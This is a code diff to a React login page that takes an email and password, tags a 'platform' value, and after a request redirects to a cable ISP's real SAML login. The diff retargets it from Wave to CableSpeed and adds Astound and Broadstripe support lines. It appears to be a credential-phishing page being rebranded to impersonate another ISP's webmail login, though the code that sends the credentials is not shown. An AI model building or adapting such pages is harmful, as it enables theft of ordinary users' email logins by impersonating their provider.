@@ -17,7 +17,7 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Wave-Auth-Gateway")
+    const[platform, setPlatform] = useState("Cable-Speed")
 
     const[showError, setShowError] = useState(false);
 
@@ -44,7 +44,7 @@ function Home(){
              // console.log(response.data.message);
   
             
-             window.location.href = 'https://wave.auth-gateway.net/saml/module.php/authSynacor/login.php?AuthState=_759233ef7bf3b4e1e19d270d330200ca4ae7bb9884%3Ahttps%3A%2F%2Fwave.auth-gateway.net%2Fsaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fmail.wavecable.com%252F%26cookieTime%3D1714740481';
+             window.location.href = 'https://cablespeed-email.auth-gateway.net/saml/module.php/authSynacor/login.php?AuthState=_56e5e2f75566a589926b780c3eb89e81af0c6c4259%3Ahttps%3A%2F%2Fcablespeed-email.auth-gateway.net%2Fsaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Femail.cablespeed.com%252F%26cookieTime%3D1714740829';
           }
         } catch (error) {
           // Handle error
@@ -166,6 +166,9 @@ Terms of Service</a>
 
 <div className='text-center py-3'>
   <h6 className='font-weight-bold'>Support - Contact Us at 1-800-4-ASTOUND</h6>
+  <p className=''style={{
+    fontSize:"14px",
+  }}>Broadstripe Customers in Maryland please call 410-987-9300</p>
 </div>
                  
 
